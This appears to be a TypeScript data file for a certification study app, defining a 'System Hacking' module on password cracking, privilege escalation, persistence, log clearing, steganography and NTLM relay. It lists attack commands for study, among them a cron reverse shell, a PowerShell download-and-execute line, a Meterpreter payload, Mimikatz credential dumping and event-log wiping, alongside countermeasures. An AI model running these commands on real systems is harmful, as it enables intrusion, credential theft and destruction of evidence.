import type { Module } from '../cehModules';

export const m06: Module = {
  id: 'm06',
  number: 'M06',
  title: 'System Hacking',
  description: 'Execute complex system exploitation including advanced password cracking methodologies, NTLM relay attacks, Linux and Windows privilege escalation vectors, and persistence mechanisms. Master operational stealth through track clearing, rootkit deployment, steganography, and anti-forensics techniques while maintaining persistent access to compromised targets.',
  examWeight: '8%',
  estimatedQuestions: 10,
  duration: '5h 15m',
  topics: [
    {
      id: 'm06-t01',
      title: 'Password Cracking & Authentication Attacks',
      content: 'Password cracking is the art of recovering plaintext passwords from their stored representations (hashes). Modern systems never store passwords in plaintext — they use one-way hash functions. Attackers must either crack the hash offline using wordlists/rules/masks, or attack the authentication mechanism online through brute-force and credential stuffing. Understanding hash types, storage locations, and cracking methodologies is fundamental to system hacking.',
      commands: [
        { command: 'john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt', description: 'John the Ripper dictionary attack using the legendary rockyou.txt wordlist' },
        { command: 'john hashes.txt --rules --wordlist=rockyou.txt', description: 'JtR with mangling rules: appends numbers, capitalizes, adds special chars to wordlist entries' },
        { command: 'john --show hashes.txt', description: 'Display all previously cracked passwords from the JtR potfile' },
        { command: 'hashcat -m 1000 hashes.txt rockyou.txt', description: 'Hashcat GPU-accelerated NTLM hash cracking (Windows passwords)' },
        { command: 'hashcat -m 1800 hashes.txt rockyou.txt', description: 'Hashcat SHA-512 cracking for Linux /etc/shadow hashes' },
        { command: 'hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?d?d?d?s', description: 'Hashcat mask attack: Capital + 3 lower + 3 digits + special (e.g., Pass123!)' },
        { command: 'hydra -l admin -P rockyou.txt ssh://192.168.1.100', description: 'Online SSH brute-force attack with Hydra' },
        { command: 'hydra -L users.txt -P pass.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"', description: 'HTTP POST form brute-force with custom parameters' },
        { command: 'crackmapexec smb 192.168.1.100 -u users.txt -p pass.txt', description: 'SMB credential spraying across multiple users/passwords' },
        { command: 'medusa -h 192.168.1.100 -U users.txt -P pass.txt -M ssh', description: 'Medusa parallel brute-force supporting 20+ protocols' },
      ],
      keyPoints: [
        'Hash Types: MD5 (128-bit, broken), SHA-1 (160-bit, deprecated), SHA-256/512 (secure), NTLM (Windows), bcrypt/Argon2 (passwords)',
        'Attack Types: Dictionary (wordlist), Brute-force (all combinations), Rule-based (word mutations), Mask (pattern-based), Rainbow table (precomputed)',
        'Windows Password Storage: SAM database (local), NTDS.dit (domain controller), LSASS memory (running credentials)',
        'Linux Password Storage: /etc/shadow (hash + salt) — format: $id$salt$hash where $6$ = SHA-512',
        'Password Salting: Random data appended before hashing — defeats rainbow tables by making each hash unique',
        'Credential Stuffing: Using leaked username/password pairs from data breaches against other services',
        'Pass-the-Hash (PtH): Using the NTLM hash directly for authentication without knowing the plaintext password',
        'Hashcat modes: -m 0 (MD5), -m 1000 (NTLM), -m 1800 (SHA-512/Unix), -m 3200 (bcrypt), -m 13100 (Kerberoast)',
      ],
    },
    {
      id: 'm06-t02',
      title: 'Privilege Escalation — Linux',
      content: 'Privilege escalation is the process of exploiting a vulnerability, design flaw, or misconfiguration to gain elevated access — typically root on Linux. After gaining initial access as a low-privilege user, escalation to root is almost always the next objective. Linux privilege escalation relies on SUID binaries, misconfigured sudo rules, cron job hijacking, kernel exploits, writable PATH directories, and capability abuse.',
      commands: [
        { command: 'sudo -l', description: 'List sudo privileges for current user — the FIRST command to run after gaining access' },
        { command: 'find / -perm -4000 -type f 2>/dev/null', description: 'Find all SUID binaries — any of these could be exploitable via GTFOBins' },
        { command: 'find / -perm -2000 -type f 2>/dev/null', description: 'Find all SGID binaries — group-level privilege escalation vectors' },
        { command: 'getcap -r / 2>/dev/null', description: 'Find binaries with Linux capabilities (e.g., cap_setuid = instant root)' },
        { command: 'cat /etc/crontab && ls -la /etc/cron*', description: 'Check system cron jobs — writable scripts run by root = instant escalation' },
        { command: 'find / -writable -type f 2>/dev/null | grep -v proc', description: 'Find world-writable files that could be hijacked' },
        { command: 'cat /etc/passwd | grep -v nologin | grep -v false', description: 'List all users with valid login shells' },
        { command: './linpeas.sh', description: 'LinPEAS automated privilege escalation enumeration — color-coded findings' },
        { command: 'uname -a', description: 'Check kernel version — search for known kernel exploits (DirtyPipe, DirtyCow)' },
        { command: 'echo $PATH', description: 'Check PATH for writable directories — PATH hijacking if a SUID binary uses relative paths' },
      ],
      keyPoints: [
        'SUID (Set User ID): Binary runs as the FILE OWNER regardless of who executes it — if owned by root, instant root access',
        'GTFOBins: Essential reference — documents how to exploit 300+ Linux binaries for privilege escalation (gtfobins.github.io)',
        'Sudo Misconfigs: sudo ALL=(ALL) NOPASSWD: /usr/bin/vim → vim -c ":!bash" → root shell',
        'Cron Job Hijacking: If a cron job runs a script writable by your user, replace it with a reverse shell',
        'Kernel Exploits: DirtyCow (CVE-2016-5195), DirtyPipe (CVE-2022-0847), PwnKit (CVE-2021-4034)',
        'PATH Hijacking: If a SUID binary calls a command without full path, create a malicious version in a writable PATH directory',
        'Capabilities: cap_setuid on any binary = root. cap_dac_read_search = read any file. Check with getcap.',
        'Docker Escape: If user is in docker group → mount host filesystem → read /etc/shadow → root on host',
        'LD_PRELOAD: If sudo preserves LD_PRELOAD (env_keep), inject a malicious shared library for instant root',
      ],
    },
    {
      id: 'm06-t03',
      title: 'Privilege Escalation — Windows',
      content: 'Windows privilege escalation targets the path from a standard user to SYSTEM or Administrator. Key vectors include token impersonation (SeImpersonatePrivilege), unquoted service paths, writable service binaries, AlwaysInstallElevated MSI abuse, DLL hijacking, registry autorun exploitation, and UAC bypass. Tools like WinPEAS, PowerUp, and Seatbelt automate the discovery process.',
      commands: [
        { command: 'whoami /priv', description: 'List current user privileges — look for SeImpersonate, SeAssignPrimaryToken, SeBackup' },
        { command: 'whoami /groups', description: 'List group memberships — check for BUILTIN\\Administrators or Backup Operators' },
        { command: 'systeminfo', description: 'Full system info: OS version, hotfixes installed, architecture — cross-reference for kernel exploits' },
        { command: 'wmic qfe list', description: 'List all installed patches/hotfixes — identify missing critical updates' },
        { command: 'wmic service get name,pathname | findstr /i /v "C:\\Windows"', description: 'Find unquoted service paths — classic privilege escalation vector' },
        { command: 'sc qc <SERVICE>', description: 'Query service configuration: binary path, start type, service account' },
        { command: 'accesschk.exe /accepteula -uwcqv "Everyone" *', description: 'Find services writable by Everyone — replace binary for SYSTEM shell' },
        { command: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', description: 'Check if MSI files always install with SYSTEM privileges' },
        { command: '.\\winpeas.exe', description: 'WinPEAS automated Windows privilege escalation enumeration' },
        { command: 'powershell IEX(New-Object Net.WebClient).downloadString("http://<IP>/PowerUp.ps1"); Invoke-AllChecks', description: 'PowerUp automated privesc check — finds misconfigs and generates exploits' },
      ],
      keyPoints: [
        'SeImpersonatePrivilege: Available to service accounts — exploit with PrintSpoofer, JuicyPotato, GodPotato for SYSTEM',
        'Unquoted Service Paths: If path has spaces without quotes, Windows searches each directory — drop malicious exe in earlier path',
        'AlwaysInstallElevated: If enabled in both HKLM and HKCU, any MSI installs as SYSTEM — generate malicious MSI with msfvenom',
        'DLL Hijacking: If an application loads a DLL from a writable directory, replace it with a malicious version',
        'Token Impersonation Tools: PrintSpoofer (modern, works on Server 2019+), JuicyPotato (older), GodPotato (universal)',
        'UAC Bypass: Techniques to elevate from medium to high integrity without triggering the UAC prompt',
        'Scheduled Tasks: Tasks running as SYSTEM with writable scripts/binaries = privilege escalation',
        'Registry Autoruns: HKCU\\...\\Run keys execute at login — add payload for persistence + escalation if admin logs in',
      ],
    },
    {
      id: 'm06-t04',
      title: 'Maintaining Access & Persistence',
      content: 'After gaining elevated access, attackers establish persistence mechanisms to survive reboots, password changes, and even system patches. Persistence can be achieved through scheduled tasks, registry modifications, WMI event subscriptions, cron jobs, SSH key injection, web shells, and rootkits. Understanding these techniques is essential for both attack (red team) and defense (blue team/incident response).',
      commands: [
        { command: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v malware /t REG_SZ /d "C:\\payload.exe"', description: 'Registry Run key persistence — executes payload at every user login' },
        { command: 'schtasks /create /tn "Updater" /tr "C:\\payload.exe" /sc ONLOGON /ru SYSTEM', description: 'Scheduled task persistence running as SYSTEM on any user login' },
        { command: 'echo "ssh-rsa <PUB_KEY>" >> ~/.ssh/authorized_keys', description: 'SSH key persistence — passwordless access that survives password changes' },
        { command: 'echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/<IP>/4444 0>&1\'" | crontab -', description: 'Cron job persistence — reverse shell every minute' },
        { command: 'cp /bin/bash /tmp/.backdoor; chmod +s /tmp/.backdoor', description: 'SUID backdoor — /tmp/.backdoor -p gives root shell anytime' },
        { command: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > payload.exe', description: 'Generate Meterpreter payload for persistent callback' },
      ],
      keyPoints: [
        'Registry Persistence: HKCU\\...\\Run (user-level), HKLM\\...\\Run (machine-level), RunOnce (single execution)',
        'WMI Event Subscriptions: Extremely stealthy Windows persistence — triggers on events like user login or timer',
        'Rootkits: Kernel-level (ring 0) vs User-level (ring 3) — kernel rootkits modify OS itself, nearly undetectable',
        'Bootkits: Infect the Master Boot Record (MBR) or UEFI firmware — persist even after OS reinstall',
        'Web Shells: PHP/ASP/JSP backdoors on web servers — provide command execution via browser',
        'C2 Frameworks: Cobalt Strike, Sliver, Havoc — enterprise-grade command and control platforms',
        'Living-off-the-Land (LotL): Using legitimate tools (PowerShell, WMI, certutil) to avoid detection',
      ],
    },
    {
      id: 'm06-t05',
      title: 'Clearing Tracks & Anti-Forensics',
      content: 'After an engagement (or attack), clearing tracks involves removing evidence of the intrusion from logs, file systems, and network records. This includes clearing event logs, modifying timestamps (timestomping), deleting command history, and disabling auditing. Anti-forensics techniques make incident response and digital forensics investigations significantly harder.',
      commands: [
        { command: 'history -c && history -w', description: 'Clear bash command history and write empty history file' },
        { command: 'echo "" > ~/.bash_history', description: 'Overwrite bash history file with empty content' },
        { command: 'wevtutil cl System', description: 'Clear Windows System event log' },
        { command: 'wevtutil cl Security', description: 'Clear Windows Security event log (logon/logoff, privilege use)' },
        { command: 'wevtutil cl Application', description: 'Clear Windows Application event log' },
        { command: 'touch -t 202301010000 malware.exe', description: 'Timestomping: modify file timestamp to blend with legitimate files' },
        { command: 'timestomp payload.exe -m "01/01/2023 00:00:00"', description: 'Meterpreter timestomp: modify MACE attributes (Modified, Accessed, Created, Entry)' },
        { command: 'shred -vfz -n 5 sensitive_file', description: 'Securely delete a file by overwriting it 5 times with random data then zeros' },
      ],
      keyPoints: [
        'Windows Event Logs: Security (4624=logon, 4625=failed logon, 4688=process creation), System, Application, PowerShell',
        'Linux Logs: /var/log/auth.log (SSH/sudo), /var/log/syslog, /var/log/apache2/access.log, ~/.bash_history',
        'Timestomping: Modifying MACE timestamps (Modified, Accessed, Created, Entry Modified) to evade timeline analysis',
        'Log Tampering: Selectively editing log entries is stealthier than clearing entire logs (which itself creates a log entry)',
        'Alternate Data Streams (ADS): Windows NTFS feature to hide data inside existing files — payload.exe:hidden.txt',
        'Steganography: Hiding data within images, audio, or video files — tools: steghide, OpenStego, Snow',
        'Disk Wiping: Tools like DBAN, Eraser, and shred overwrite data to prevent forensic recovery',
        'Anti-forensics awareness: Modern SIEM and EDR solutions detect log clearing — immutable/centralized logging is the countermeasure',
      ],
    },
    {
      id: 'm06-t06',
      title: 'Steganography & Data Hiding',
      content: 'Steganography is the practice of hiding secret data within ordinary, non-secret data — typically images, audio, or video files. Unlike encryption (which makes data unreadable), steganography makes data invisible. Attackers use steganography for covert communication, data exfiltration, and hiding malware payloads within innocent-looking files.',
      commands: [
        { command: 'steghide embed -cf cover.jpg -ef secret.txt -p password', description: 'Hide secret.txt inside cover.jpg with password protection' },
        { command: 'steghide extract -sf image.jpg -p password', description: 'Extract hidden data from a steganographic image' },
        { command: 'steghide info image.jpg', description: 'Check if an image contains hidden data and its capacity' },
        { command: 'exiftool image.jpg', description: 'View all metadata: camera model, GPS coordinates, timestamps, software used' },
        { command: 'binwalk image.png', description: 'Analyze file for embedded files, compressed archives, and executable code' },
        { command: 'binwalk -e image.png', description: 'Extract all embedded files found within the image' },
        { command: 'strings image.jpg | head -50', description: 'Extract readable ASCII strings — quick check for hidden text or URLs' },
        { command: 'zsteg image.png', description: 'Detect LSB (Least Significant Bit) steganography in PNG images' },
      ],
      keyPoints: [
        'LSB (Least Significant Bit): Most common image steganography technique — modifies the least important bits of pixels',
        'Steganography vs Cryptography: Stego hides the existence of data, crypto makes data unreadable — can be combined',
        'Image Stego Tools: steghide (JPEG), zsteg (PNG), OpenStego (all formats), Snow (whitespace stego in text)',
        'Audio Stego: Hiding data in audio files using tools like DeepSound, AudioStego, and mp3stego',
        'Network Stego: Hiding data in TCP/IP headers, ICMP payloads, or DNS queries for covert channels',
        'Steganalysis: Detecting steganography — statistical analysis, visual inspection, chi-square test, RS analysis',
        'NTFS Alternate Data Streams: echo "hidden" > file.txt:secret — hides data in a file stream invisible to dir command',
      ],
    },
    {
      id: 'm06-t07',
      title: 'NTLM Relay & Pass-the-Hash Attacks',
      content: 'NTLM (NT LAN Manager) is the legacy Windows authentication protocol still widely used in enterprise environments. NTLM relay attacks intercept authentication attempts and relay them to another service to gain unauthorized access. Pass-the-Hash (PtH) attacks use captured NTLM hashes directly for authentication without ever cracking the password. These are among the most powerful techniques in Active Directory environments.',
      commands: [
        { command: 'responder -I eth0 -rdwv', description: 'Responder: poison LLMNR/NBT-NS/MDNS to capture NTLM hashes from network authentication requests' },
        { command: 'ntlmrelayx.py -tf targets.txt -smb2support', description: 'Relay captured NTLM authentication to target SMB servers for unauthorized access' },
        { command: 'ntlmrelayx.py -tf targets.txt --no-http-server -smb2support -i', description: 'NTLM relay with interactive SMB shell on successful relay' },
        { command: 'pth-winexe -U "domain/admin%hash:hash" //192.168.1.100 cmd.exe', description: 'Pass-the-Hash: execute commands using NTLM hash instead of password' },
        { command: 'crackmapexec smb 192.168.1.100 -u admin -H <NTLM_HASH> -x "whoami"', description: 'CrackMapExec Pass-the-Hash command execution' },
        { command: 'mimikatz # sekurlsa::logonpasswords', description: 'Mimikatz: dump plaintext passwords and NTLM hashes from LSASS memory' },
        { command: 'mimikatz # lsadump::sam', description: 'Mimikatz: dump local SAM database hashes' },
      ],
      keyPoints: [
        'NTLM Authentication: Challenge-Response protocol — server sends challenge, client responds with hash(password + challenge)',
        'LLMNR/NBT-NS Poisoning: When DNS fails, Windows falls back to broadcast protocols — Responder poisons these to capture hashes',
        'NTLMv1 vs NTLMv2: v1 is trivially crackable, v2 is more secure but still relayable — both are captured by Responder',
        'NTLM Relay: Intercepting authentication and forwarding it to another server — victim authenticates YOU to the target',
        'SMB Signing: If disabled (default on workstations), NTLM relay attacks work — if enabled, relay is blocked',
        'Pass-the-Hash: Using the raw NTLM hash for authentication — no password cracking needed',
        'Mimikatz: The most famous credential extraction tool — dumps plaintext passwords, hashes, Kerberos tickets from memory',
        'Countermeasure: Enable SMB signing, disable LLMNR/NBT-NS via GPO, enforce NTLMv2 minimum, use Kerberos instead',
      ],
    },
  ],
  keyTools: ['John the Ripper', 'Hashcat', 'Hydra', 'Mimikatz', 'LinPEAS', 'WinPEAS', 'Responder', 'CrackMapExec', 'PowerUp', 'steghide'],
  countermeasures: [
    'Enforce strong password policies: minimum 12 characters, complexity requirements, no common passwords',
    'Implement Multi-Factor Authentication (MFA) for all user accounts, especially administrators',
    'Regular privilege audits: review sudo rules, SUID binaries, service account permissions quarterly',
    'Deploy EDR (Endpoint Detection and Response) and SIEM for real-time monitoring of suspicious activities',
    'Enable immutable centralized logging to prevent log tampering — forward logs to write-once storage',
    'Disable LLMNR and NBT-NS via Group Policy to prevent Responder-style NTLM capture attacks',
    'Enable SMB signing on all Windows systems to prevent NTLM relay attacks',
    'Use LAPS (Local Administrator Password Solution) to randomize local admin passwords across the domain',
    'Implement application whitelisting to prevent unauthorized executables from running',
    'Deploy file integrity monitoring (FIM) to detect unauthorized changes to critical system files',
  ],
  commonPorts: [
    { port: 22, protocol: 'TCP', service: 'SSH', description: 'Secure Shell — brute-force target, key-based auth preferred' },
    { port: 23, protocol: 'TCP', service: 'Telnet', description: 'Cleartext remote access — credentials visible on the wire' },
    { port: 135, protocol: 'TCP', service: 'MSRPC', description: 'Microsoft RPC — used for WMI, DCOM, and remote service management' },
    { port: 445, protocol: 'TCP', service: 'SMB', description: 'File sharing — PtH, relay attacks, EternalBlue exploitation' },
    { port: 3389, protocol: 'TCP', service: 'RDP', description: 'Remote Desktop — brute-force, BlueKeep, session hijacking' },
    { port: 5985, protocol: 'TCP', service: 'WinRM', description: 'Windows Remote Management — Evil-WinRM shell access' },
    { port: 5986, protocol: 'TCP', service: 'WinRM-S', description: 'WinRM over HTTPS — encrypted remote management' },
  ],
  examTips: [
    'Know the difference between online (Hydra, Medusa) and offline (Hashcat, John) password attacks',
    'SUID binaries are THE most tested Linux privesc vector — find / -perm -4000 and check GTFOBins',
    'SeImpersonatePrivilege on Windows = use Potato exploits (JuicyPotato, PrintSpoofer, GodPotato) for SYSTEM',
    'Mimikatz sekurlsa::logonpasswords dumps plaintext creds from LSASS — this is THE credential extraction command',
    'Pass-the-Hash uses the NTLM hash directly — you do NOT need to crack it first',
    'Steganography hides data existence, cryptography makes data unreadable — know the distinction',
    'steghide works with JPEG, BMP — NOT PNG. zsteg is for PNG LSB steganography.',
    'Windows Event Log IDs: 4624 (successful logon), 4625 (failed logon), 4688 (new process), 1102 (log cleared)',
    'Clearing Security event log generates Event ID 1102 — you cannot hide the fact that logs were cleared',
    'Rootkits: Kernel-level = ring 0 (OS level), User-level = ring 3 (application level) — kernel rootkits are stealthier',
  ],
  realWorldScenarios: [
    'You gain initial SSH access as www-data on a Linux server. Running sudo -l reveals the user can run /usr/bin/find as root without a password. Using GTFOBins: sudo find . -exec /bin/bash \\; gives you an instant root shell.',
    'During an internal pentest, you run Responder on the network and capture 47 NTLMv2 hashes within 10 minutes from LLMNR poisoning. You crack 12 of them using hashcat with rockyou.txt, including a domain administrator password.',
    'You discover a Windows service with an unquoted path: C:\\Program Files\\My App\\service.exe. You drop a malicious Program.exe in C:\\ — when the service restarts, Windows finds your payload first and executes it as SYSTEM.',
    'After compromising a web server, you hide an exfiltrated customer database inside a JPEG image using steghide and upload it to a public image hosting service — the file passes all content filters because it appears to be a normal photo.',
  ],
  prerequisites: ['M04 — Enumeration provides the usernames, shares, and service details needed for system attacks', 'M05 — Vulnerability analysis identifies the specific weaknesses to exploit'],
};
